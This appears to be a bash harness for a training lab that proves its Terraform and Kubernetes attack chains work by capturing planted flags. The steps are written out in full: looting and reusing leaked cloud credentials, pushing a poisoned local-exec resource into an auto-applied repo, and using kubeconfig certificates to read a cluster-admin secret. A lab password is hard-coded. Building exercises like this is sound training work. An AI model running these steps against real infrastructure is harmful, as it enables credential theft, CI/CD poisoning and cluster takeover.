#!/usr/bin/env bash
# playthrough.sh — runs ON the edge (operator/controller). ACTUALLY exploits each ENABLED scenario
# as a player on the VPC would, and checks the planted flag. Proves the kill-chains fire end-to-end
# (not just that artifacts exist). New tracks are appended here as M2 lands them.
#   usage (from repo root, via orchestrator):  ./orchestrator/lab verify   (or scp + run on edge)
OP=/opt/minilab2/op.key
S="ssh -i $OP -o StrictHostKeyChecking=no -o ConnectTimeout=15"
on(){ h="$1"; shift; $S root@"$h" "$@"; }
AU=svc-admin; AP='Min2lab-Adm!n-2026'; G=http://gitea:3000
PASS=0; FAIL=0; declare -a FAILED
ok(){ printf '  \033[1;32mPASS\033[0m %-6s %s\n' "$1" "$2"; PASS=$((PASS+1)); }
no(){ printf '  \033[1;31mFAIL\033[0m %-6s %s\n' "$1" "$2"; FAIL=$((FAIL+1)); FAILED+=("$1"); }
# chk <id> <flag-inner> <captured-output>
chk(){ if echo "$3" | grep -q "MINILAB{$2}"; then ok "$1" "captured MINILAB{$2}"; \
       else no "$1" "no flag (got: $(echo "$3" | tr -d '\n' | head -c160))"; fi; }
enabled(){ grep -qxF "$1" /opt/minilab2/enabled_scenarios 2>/dev/null; }
# rsx <host> <user> — run a script read from stdin on <host> as <user>, via base64 (no quoting hell)
rsx(){ local host="$1" user="$2" b64; b64=$(base64 -w0)
  if [ "$user" = root ]; then on "$host" "echo $b64 | base64 -d | bash"
  else on "$host" "f=/tmp/.rsx.$$; echo $b64 | base64 -d > \$f; chmod 755 \$f; su $user -c \"bash \$f\"; rm -f \$f"; fi; }

echo "### Terraform / IaC kill-chains ###"

# --- tf_3: cross-team remote state exfil -------------------------------------
# foothold on the alpha apply host (atlantis) -> loot leaked beta cloud creds ->
# use them against MinIO to read team beta's remote state (cross-tenant boundary break).
if enabled tf_3; then
  creds=$(on atlantis "cat /home/deployer/.beta/creds 2>/dev/null")
  bk=$(echo "$creds" | sed -n 's/AWS_ACCESS_KEY_ID=//p'); bs=$(echo "$creds" | sed -n 's/AWS_SECRET_ACCESS_KEY=//p')
  if [ -n "$bk" ] && [ -n "$bs" ]; then
    out=$(on backend "mc alias set tf3 http://127.0.0.1:9000 '$bk' '$bs' >/dev/null 2>&1 && mc cat tf3/tf-state-beta/prod/terraform.tfstate 2>/dev/null")
    chk tf_3 tf_3-cross-team-state "$out"
  else no tf_3 "no leaked beta creds on atlantis"; fi
fi

# --- tf_4: writable auto-applied IaC + scheduled apply (deployer identity) ----
# attacker with SCM write poisons the repo the cron drift-apply pulls; the scheduled
# `iac-apply.sh` then runs attacker code as the privileged deployer -> reads deployer's flag.
if enabled tf_4; then
  W=$(mktemp -d)
  git clone -q "http://$AU:$AP@gitea:3000/alpha/infra.git" "$W/infra" 2>/dev/null
  cat > "$W/infra/pwn.tf" <<'TF'
resource "null_resource" "pwn" {
  triggers = { ts = timestamp() }   # re-fire on every apply (repeatable kill-chain)
  provisioner "local-exec" { command = "cat /home/deployer/flag.txt > /tmp/tf4-proof 2>/dev/null" }
}
TF
  ( cd "$W/infra" && git -c user.email=atk@x -c user.name=atk add -A \
    && { git -c user.email=atk@x -c user.name=atk commit -q -m "drift fix" || true; } \
    && git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
  rm -rf "$W"
  on atlantis "rm -f /tmp/tf4-proof; su deployer -c /usr/local/bin/iac-apply.sh" >/dev/null 2>&1
  chk tf_4 tf_4-state-poisoning "$(on atlantis 'cat /tmp/tf4-proof 2>/dev/null')"
fi

# --- tf_5: transitive module exec (trusted module pulls a submodule w/ a provisioner) ---
# consume the "trusted" alpha/tf-modules//note; it now transitively sources a nested module
# whose local-exec fires on apply -> writes the proof. Player applies a tiny consumer.
if enabled tf_5; then
  out=$(rsx atlantis deployer <<'EOF'
set -e
cd /home/deployer; rm -rf pt5; mkdir pt5; cd pt5
cat > main.tf <<'TF'
module "note" {
  source = "git::http://gitea:3000/alpha/tf-modules.git//note?ref=main"
  name   = "pt5"
}
TF
rm -f /tmp/tf5-proof
/usr/local/bin/terraform init -input=false -no-color >/dev/null 2>&1
/usr/local/bin/terraform apply -auto-approve -no-color >/dev/null 2>&1
cat /tmp/tf5-proof 2>/dev/null
EOF
)
  chk tf_5 tf_5-transitive-module "$out"
fi

# --- tf_6: over-privileged apply identity -> cluster-admin kubeconfig -> crown secret ---
# the apply host holds a cluster-admin kubeconfig (over-priv). Use its client cert to hit the
# k8s API directly (no kubectl needed) and read a kube-system secret only cluster-admin can see.
if enabled tf_6; then
  out=$(rsx atlantis root <<'EOF'
set -e
K=/home/deployer/.kube/config
T=$(mktemp -d)
grep 'certificate-authority-data' "$K" | awk '{print $2}' | base64 -d > "$T/ca"
grep 'client-certificate-data'    "$K" | awk '{print $2}' | base64 -d > "$T/crt"
grep 'client-key-data'            "$K" | awk '{print $2}' | base64 -d > "$T/key"
curl -s --cacert "$T/ca" --cert "$T/crt" --key "$T/key" \
  https://k8s:6443/api/v1/namespaces/kube-system/secrets/crown \
  | sed -n 's/.*"flag": *"\([^"]*\)".*/\1/p' | base64 -d 2>/dev/null
rm -rf "$T"
EOF
)
  chk tf_6 tf_6-k8s-rbac-backdoor "$out"
fi

echo
printf '### playthrough: %d passed, %d failed ###\n' "$PASS" "$FAIL"
[ "$FAIL" -gt 0 ] && echo "FAILED: ${FAILED[*]}"
exit 0
